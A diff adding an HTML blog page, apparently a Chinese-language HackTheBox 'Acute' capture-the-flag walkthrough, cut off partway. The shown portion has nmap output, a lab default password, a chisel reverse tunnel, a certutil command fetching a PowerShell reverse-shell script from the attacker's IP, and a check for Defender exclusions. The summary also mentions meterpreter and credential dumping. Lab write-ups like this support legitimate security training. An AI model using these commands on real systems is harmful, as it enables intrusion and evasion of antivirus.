@@ -1,0 +1,1159 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="false"><head>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title>HTB Acute &middot; Blowfish</title>
+    <meta name="title" content="HTB Acute &middot; Blowfish">
+
+  
+  
+  
+  
+  
+  <link rel="canonical" href="https://ink410.github.io/posts/htb-acute/">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.5c1f183abbd81c1e3325f920a27cbb9ba254b48fb31ea3618517bff4770f91f0ae423c9e8292ba4cf2bd80c63fd0d2da86c482956da99c3c0e48b5a3911df364.css"
+    integrity="sha512-XB8YOrvYHB4zJfkgony7m6JUtI&#43;zHqNhhRe/9HcPkfCuQjyegpK6TPK9gMY/0NLahsSClW2pnDwOSLWjkR3zZA==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.98bb8ce8f123e03c4d2171eeec151dd404b5c476beb5ef1068d0e8b1a2afb923065e6552fc14b2d867c85ee4bd8529a43193f729f874d3908517ba03b5d1cc57.js"
+      integrity="sha512-mLuM6PEj4DxNIXHu7BUd1AS1xHa&#43;te8QaNDosaKvuSMGXmVS/BSy2GfIXuS9hSmkMZP3Kfh005CFF7oDtdHMVw=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="https://ink410.github.io/posts/htb-acute/">
+  <meta property="og:site_name" content="Blowfish">
+  <meta property="og:title" content="HTB Acute">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-23T10:01:38+08:00">
+    <meta property="article:modified_time" content="2025-07-23T10:01:38+08:00">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB Acute">
+
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "HTB Acute",
+    "headline": "HTB Acute",
+    
+    
+    "inLanguage": "en",
+    "url" : "https:\/\/ink410.github.io\/posts\/htb-acute\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-07-23T10:01:38\u002b08:00",
+    "datePublished": "2025-07-23T10:01:38\u002b08:00",
+    
+    "dateModified": "2025-07-23T10:01:38\u002b08:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1253"
+  }]
+  </script>
+
+
+
+  
+  
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
+      >
+    </div>
+    
+    
+      
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">
+          Blowfish
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href="/posts/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Posts">
+    HTB
+  </p>
+</a>
+
+
+
+      
+    
+
+    
+
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+        <div class="flex items-center justify-center dark:hidden">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/posts/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Posts">
+      HTB
+    </p>
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+
+
+  <article>
+    
+
+
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB Acute
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-07-23T10:01:38&#43;08:00">23 July 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1253 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+
+        
+          
+          
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+        
+
+        
+
+        
+          <div class="mb-5"></div>
+        
+
+      
+
+    </header>
+
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>Acute是Hackthebox困难难度的靶机，本身并没有什么特别复杂或者特殊的利用方式，需要进行详细的枚举，综合评估得到的信息。首先通过web页面得到一个docx文档，通过文档得到了初始立足点所需要的所有信息，得到立足点后，经过尝试发现存在杀软不检查的目录，从而得到了执行winpeas的可能，winpeas的结果显示存在RDP连接，至此，<code>msfvenom</code>生成一个<code>payload</code>，通过<code>meterpreter</code>得到shell，然后通过msf的后渗透模块截屏，从而得到第一个<code>pscredential</code>。测试winrm是正常的，但是实际调用的时候无法正常通过<code>Enter-PSSession</code>拿到<code>powershell</code>，转而尝试使用<code>invoke-command</code>，找到一个ps1脚本，通过替换脚本中的内容，调用nc从而得到另一个用户的shell，查看权限发现这个用户是本地的管理员用户，那么可以拿到sam和system，使用msf下载文件，impacket-secretsdump本地破解NT哈希，再拿到第二个密码后尝试更换用户名，使用这个密码登录PSWA，都没能成功，转而使用这个密码更换用户名，尝试调用invoke-command命令。最终成功得到了另一个用户的命令执行能力。这里又是不断的枚举，在<code>program files</code>这个常规的windows安装软件的目录中找到可以利用的点，从而通过bat脚本结合<code>net group</code>的信息，以及之前的docx文件的信息，综合判断下，将用户添加进一个高权限的用户组，从而读取到root.txt</p>
+<p>总的来说，这台靶机的难度在于枚举是否仔细，对于已拥有的信息是否进行合理的管理和判断，以及对于Windows用户、用户组，权限的了解。以及对于powershell的一些基本使用，如果本身对于windows的利用经验比较少，那么这台靶机的难度是比较大的.</p>
+
+<h3 class="relative group">Recon 
+    <div id="recon" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#recon" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.95 scan initiated Sun Jul 13 05:47:55 2025 as: /usr/lib/nmap/nmap -sT -p 443 -sC -sV -O -oA nmapscan/details 10.10.11.145</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.145
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.072s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>atsserver.acute.local
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2022-01-06T06:34:58
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2030-01-04T06:34:58
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-07-13T09:25:09+00:00<span class="p">;</span> -23m09s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
+</span></span><span class="line"><span class="cl">Device type: general purpose
+</span></span><span class="line"><span class="cl">Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows 2019<span class="p">|</span><span class="m">10</span> <span class="o">(</span>97%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+</span></span><span class="line"><span class="cl">Aggressive OS guesses: Windows Server <span class="m">2019</span> <span class="o">(</span>97%<span class="o">)</span>, Microsoft Windows <span class="m">10</span> <span class="m">1903</span> - 21H1 <span class="o">(</span>91%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span><span class="nb">test</span> conditions non-ideal<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: -23m09s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sun Jul 13 05:48:18 2025 -- 1 IP address (1 host up) scanned in 23.01 seconds</span>
+</span></span></code></pre></div><p>根据详细扫描的结果将域名添加到hosts文件中</p>
+<p><code>sed -i '1i 10.10.11.145 atsserver.acute.local acute.local'</code></p>
+
+<h3 class="relative group">PSWA(Windows PowerShell Web Access) 
+    <div id="pswawindows-powershell-web-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pswawindows-powershell-web-access" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>在about页面下载到<code>New_Starter_CheckList_v7.docx</code>文件，文件中存在一个默认密码<code>Password1!</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">IT overview
+</span></span><span class="line"><span class="cl">Arrange for the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default Password1!. Not all staff are changing these so please be sure to run through this.
+</span></span></code></pre></div><p>在<code>Initial Probation Meeting</code>一栏当中提到<code>PSWA</code>，并且提到sessions名称是<code>dc_manage</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Initial Probation Meeting (For Academic staff on Probation only)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Arrange initial probation meeting between Probationer, Head of Department and Probation Adviser.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Run through the new PSWA to highlight the restrictions set on the sessions named dc_manage.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The probation plan should be completed within a month of the start date and should include a requirement to register with LETs re: rate to gain within 3 months of starting. Fellowship of the Higher Education Academy (FHEA).
+</span></span></code></pre></div><p><code>Induction meetings with management staff</code>当中提到一个用于远程培训的地址<code>https://atsserver.acute.local/Acute_Staff_Access</code>，是一个PSWA的登录界面</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Induction meetings with management staff
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Arrange for the new starter to meet with other staff in the department as appropriate. This could include the Head of Department and/or other members of the appointee’s team. Complete the [remote](https://atsserver.acute.local/Acute_Staff_Access) training
+</span></span></code></pre></div><p>exiftool查看一下docx文档的元数据，存在一些敏感信息.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">exiftool *.docx
+</span></span><span class="line"><span class="cl">Creator: FCastle
+</span></span><span class="line"><span class="cl">Description: Created on Acute-PC01
+</span></span><span class="line"><span class="cl">Last Modified By: Daniel
+</span></span></code></pre></div><p>docx的元数据表现了可能的用户名形式 <code>FCastle</code>  以及可能的hostname <code>Acute-PC01</code></p>
+
+<h4 class="relative group">综合一下可利用的信息 
+    <div id="综合一下可利用的信息" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e7%bb%bc%e5%90%88%e4%b8%80%e4%b8%8b%e5%8f%af%e5%88%a9%e7%94%a8%e7%9a%84%e4%bf%a1%e6%81%af" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">awallace
+</span></span><span class="line"><span class="cl">chall
+</span></span><span class="line"><span class="cl">edavies
+</span></span><span class="line"><span class="cl">imonks
+</span></span><span class="line"><span class="cl">jmorgan
+</span></span><span class="line"><span class="cl">lhopkins
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password1!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Acute-PC01
+</span></span></code></pre></div><p>内容并不多，直接手工尝试，找到可用于登录的凭证:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Username: edavies
+</span></span><span class="line"><span class="cl">Password: Password1!
+</span></span><span class="line"><span class="cl">ComputerName: Acute-PC01
+</span></span></code></pre></div>
+<h4 class="relative group">chisel转发 
+    <div id="chisel转发" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#chisel%e8%bd%ac%e5%8f%91" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>尝试以winrm登录，没有成功</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chisel server -p <span class="m">8000</span> --reverse
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">chisel</span><span class="p">.</span><span class="py">exe</span> <span class="n">client</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">9</span><span class="err">:</span><span class="mf">8000</span> <span class="n">R:</span><span class="mf">5985</span><span class="err">:</span><span class="mf">127.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">1</span><span class="err">:</span><span class="mf">5985</span>
+</span></span></code></pre></div>
+<h4 class="relative group">尝试运行反弹shell脚本 
+    <div id="尝试运行反弹shell脚本" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%b0%9d%e8%af%95%e8%bf%90%e8%a1%8c%e5%8f%8d%e5%bc%b9shell%e8%84%9a%e6%9c%ac" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certutil.exe -urlcache -split -f http://10.10.14.9/Invoke-PowerShellTcp.ps1 c:<span class="se">\p</span>rogramdata<span class="se">\I</span>nvoke-PowerShellTcp.ps1 
+</span></span></code></pre></div><p>执行脚本时提醒被杀毒软件杀掉，并且一段时间之后直接被断掉连接，再次登录到PSWA之后能看到之前上传的脚本被杀掉了。</p>
+
+<h4 class="relative group">直接上传nc并执行得到反弹shell 
+    <div id="直接上传nc并执行得到反弹shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e7%9b%b4%e6%8e%a5%e4%b8%8a%e4%bc%a0nc%e5%b9%b6%e6%89%a7%e8%a1%8c%e5%be%97%e5%88%b0%e5%8f%8d%e5%bc%b9shell" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>在随意翻目录的时候看到utils这个文件夹，里面内容有<code>chisel,exe</code>，<code>runascs.exe</code>，<code>Invoke-PortScan.ps1</code>，事实上并不是我本身上传的文件，可能这也是一个提示信息，表示这个文件夹可能是没有受到防护软件，比如<code>Windows defender</code>这类软件保护的。</p>
+<p>查看一下这个目录中的隐藏文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">get-childitem</span> <span class="n">-force</span> <span class="n">-Attributes</span> <span class="n">Hidden</span> <span class="o">-file</span>
+</span></span></code></pre></div><ul>
+<li>-file: 只显示隐藏文件</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[.ShellClassInfo]
+</span></span><span class="line"><span class="cl">InfoTip=Directory for Testing Files without Defender
+</span></span></code></pre></div><p>通过注册表交叉验证</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&#34;</span>
+</span></span></code></pre></div><p>可以看到提示<code>utils</code>这个文件夹是例外的。</p>
+
+<h5 class="relative group">调用invoke-portscan.ps1 
+    <div id="调用invoke-portscanps1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
